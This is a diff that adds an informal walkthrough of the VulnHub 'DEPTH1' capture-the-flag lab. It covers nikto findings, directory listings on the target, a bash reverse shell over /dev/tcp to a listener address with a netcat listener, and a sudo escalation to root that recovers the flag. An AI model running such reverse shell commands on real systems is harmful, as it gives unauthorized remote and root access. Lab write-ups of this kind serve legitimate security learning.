@@ -74,6 +74,56 @@ nikto -h http://192.168.73.144:8080/
 
 
 
+ /test.jsp: This might be interesting.  might hide something so search it on url as http://192.168.73.144:8080/test.jsp
+
+ 
+ listing out for user name
+ 
+ Command: ls -l /home
+
+Owner	Group	Size	Filename
+bill 	bill 	4096 	bill
+
+
+ so then i list out the tmp folder
+ 
+ 
+ Command: ls -l /tmp
+
+Owner	Group	Size	Filename
+tomcat8 	tomcat8 	4096 	hsperfdata_tomcat8
+root 	root 	4096 	systemd-private-70a6d11547824f1ba12a1cc1dd61b2af-systemd-resolved.service-W9Wr87
+root 	root 	4096 	systemd-private-70a6d11547824f1ba12a1cc1dd61b2af-systemd-timesyncd.service-yZfQxx
+tomcat8 	root 	4096 	tomcat8-tomcat8-tmp
+root 	root 	4096 	vmware-root 
+
+
+
+no-w i've to generate reverse shell using reverse shell genaretor:::::::
+ssh bill@localhost sudo bash -i >& /dev/tcp/192.168.73.129/4242 0>&1  {get it form online reverse shell generator}
+using netcat  for nc -lvp 4242
+
+::::::::getting the shell:::Boooooyahhhhhhhhhh:""""::: 
+
+
+THEn i simply use sudo -l for take a look on permissions 
+Matching Defaults entries for root on b2r:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User root may run the following commands on b2r:
+    (ALL : ALL) ALL
+root@b2r:~# sudo  su 
+then go to that root folder
+the i successfully get the flag
+which is ::
+::::::::::::::::::::::::::::::flag{WellThatWasEasy}:::::::::::::::::::::::::::::
+
+
+{ESY} DEPTH1---VULNHUB
+
+
+
 
 
   
